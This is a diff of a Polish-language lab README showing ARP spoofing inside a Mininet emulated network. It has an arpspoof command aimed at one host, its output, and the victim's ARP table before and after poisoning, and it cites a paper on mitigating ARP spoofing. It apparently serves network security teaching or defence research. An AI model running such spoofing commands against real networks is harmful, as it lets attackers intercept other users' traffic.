@@ -62,21 +62,21 @@ Przykładowe użycie arpspoof:
 
 $ mininet > h2 arpspoof -i h2-eth0 -t 10.0.0.3 10.0.0.4
 
-Przykładowy wynik arpspoof:
-$ 82:60:eb:d9:67:2d 8e:50:d3:f7:cd:d2 0806 42: arp reply 10.0.0.4 is-at 82:60:eb:d9:67:2d
+Przykładowy wynik arpspoof:  
+$ 82:60:eb:d9:67:2d 8e:50:d3:f7:cd:d2 0806 42: arp reply 10.0.0.4 is-at 82:60:eb:d9:67:2d  
 Oznacza, że 82:60:eb:d9:67:2d (H2) atakuje 8e:50:d3:f7:cd:d2 (H3) mówiąc, że adres MAC 10.0.0.4 (H4) to 82:60:eb:d9:67:2d (H2)
 
-Standardowy wygląd tablicy ARP H3:
-mininet> h3 arp -a
-? (10.0.0.4) at aa:96:d4:47:dd:c4 [ether] on h3-eth0
-? (10.0.0.1) at 52:e5:0a:4b:c0:52 [ether] on h3-eth0
-? (10.0.0.2) at 82:60:eb:d9:67:2d [ether] on h3-eth0
+Standardowy wygląd tablicy ARP H3:  
+mininet> h3 arp -a  
+? (10.0.0.4) at aa:96:d4:47:dd:c4 [ether] on h3-eth0  
+? (10.0.0.1) at 52:e5:0a:4b:c0:52 [ether] on h3-eth0  
+? (10.0.0.2) at 82:60:eb:d9:67:2d [ether] on h3-eth0  
 
-Wygląd tej samej tablicy po poprawnie przeprowadzonym ataku to:
-mininet> h3 arp -a
-? (10.0.0.4) at 82:60:eb:d9:67:2d [ether] on h3-eth0
-? (10.0.0.1) at 52:e5:0a:4b:c0:52 [ether] on h3-eth0
-? (10.0.0.2) at 82:60:eb:d9:67:2d [ether] on h3-eth0
+Wygląd tej samej tablicy po poprawnie przeprowadzonym ataku to:  
+mininet> h3 arp -a  
+? (10.0.0.4) at 82:60:eb:d9:67:2d [ether] on h3-eth0  
+? (10.0.0.1) at 52:e5:0a:4b:c0:52 [ether] on h3-eth0  
+? (10.0.0.2) at 82:60:eb:d9:67:2d [ether] on h3-eth0  
 
 # Literatura:
 1.Ahmed M Abdelsalam, Ashraf El-Sisi i Vamshi Reddy,"Mitigating ARP Spoofing Attacks in Software-Defined Networks", ICCTA 2015
